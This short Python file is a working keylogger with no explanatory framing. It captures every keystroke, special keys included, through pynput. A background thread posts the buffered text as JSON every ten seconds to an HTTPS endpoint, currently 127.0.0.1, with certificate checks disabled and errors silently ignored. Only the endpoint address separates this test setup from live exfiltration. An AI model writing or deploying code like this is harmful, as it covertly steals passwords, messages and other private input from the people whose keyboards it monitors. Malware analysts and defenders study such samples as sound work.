from pynput import keyboard
import requests
import urllib3
from threading import Thread
import time

wait=10
delta_data=""
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

def on_press(key):
    global delta_data
    error=Exception
    try:
        delta_data+=key.char
    except AttributeError:
        special_key = f'[{key}]'
        delta_data+=special_key
    
def listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def sender():
    global delta_data
    while True:
        if delta_data:
            obj={"message":delta_data}
            try:
                requests.post("https://127.0.0.1:443/", json=obj, verify=False)
                delta_data=""
            except:
                pass
            time.sleep(wait)

if __name__ == "__main__":
    thread2 = Thread(target=listener)
    thread1 = Thread(target=sender)
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()
